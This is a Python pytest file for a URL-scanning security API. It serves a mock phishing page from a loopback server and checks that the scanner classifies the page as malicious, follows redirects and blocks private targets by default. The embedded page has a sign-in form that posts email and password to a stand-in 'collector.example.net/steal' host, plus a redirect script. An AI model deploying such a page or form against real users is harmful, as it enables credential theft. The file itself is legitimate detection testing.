"""End-to-end URL scan against a controlled loopback fixture server.

Private-network targeting is enabled only inside this test app so the scanner
can reach a server bound to 127.0.0.1 on a random port. Production defaults
block both private addresses and non-standard ports.
"""

from __future__ import annotations

import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

PAGE = b"""<!doctype html>
<html>
  <head><title>Account sign-in</title></head>
  <body>
    <h1>Sign in to continue</h1>
    <form method="post" action="http://collector.example.net/steal">
      <input type="email" name="email">
      <input type="password" name="password">
      <button type="submit">Sign in</button>
    </form>
    <script>window.location = "http://collector.example.net/next";</script>
  </body>
</html>
"""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802 - stdlib naming
        if self.path == "/redirect":
            self.send_response(302)
            self.send_header("Location", "/login")
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(PAGE)))
        self.end_headers()
        self.wfile.write(PAGE)

    def log_message(self, *_args):  # keep pytest output quiet
        pass


@pytest.fixture()
def fixture_server():
    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1]
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


@pytest.fixture()
def live_app(app, fixture_server):
    app.config["ALLOW_PRIVATE_NETWORK_TARGETS"] = True
    app.config["ALLOWED_PORTS"] = {fixture_server}
    return app


def test_url_scan_retrieves_html_and_explains_risk(live_app, client, auth, fixture_server):
    response = client.post(
        "/api/scan/url",
        json={"url": f"http://127.0.0.1:{fixture_server}/login"},
        headers=auth["headers"],
    )
    assert response.status_code == 201, response.get_json()
    data = response.get_json()["data"]
    analysis = data["analysis"]

    assert data["input_type"] == "url"
    assert analysis["http"]["available"] is True
    assert analysis["http"]["status_code"] == 200
    assert analysis["html"]["available"] is True
    assert analysis["html"]["title"] == "Account sign-in"
    assert analysis["html"]["password_field_count"] == 1

    ids = {item["indicator_id"] for item in analysis["assessment"]["supporting_findings"]}
    assert "html_external_form_action" in ids
    assert "html_password_no_tls" in ids
    assert data["classification"] == "malicious"
    assert data["risk_score"] >= 85
    assert analysis["assessment"]["decision_trace"]

    # The HTML excerpt may be shown, but the raw response body must not be stored.
    assert "visible_text" in analysis["html"]
    raw = response.get_data(as_text=True)
    assert "<script>window.location" not in raw


def test_redirect_chain_is_followed_and_revalidated(live_app, client, auth, fixture_server):
    response = client.post(
        "/api/scan/url",
        json={"url": f"http://127.0.0.1:{fixture_server}/redirect"},
        headers=auth["headers"],
    )
    assert response.status_code == 201
    http = response.get_json()["data"]["analysis"]["http"]
    assert http["available"] is True
    assert len(http["redirect_chain"]) == 2
    assert http["final_url"].endswith("/login")


def test_private_targets_are_blocked_by_default(app, client, auth, fixture_server):
    # The default test configuration only allows ports 80/443, so the fixture
    # port is rejected before any socket is opened.
    response = client.post(
        "/api/scan/url",
        json={"url": f"http://127.0.0.1:{fixture_server}/login"},
        headers=auth["headers"],
    )
    assert response.status_code == 422
    assert response.get_json()["error"]["code"] == "blocked_port"

    # A standard port on a loopback address reaches the address check instead.
    response = client.post(
        "/api/scan/url",
        json={"url": "http://127.0.0.1/admin"},
        headers=auth["headers"],
    )
    assert response.status_code == 422
    assert response.get_json()["error"]["code"] == "blocked_address"
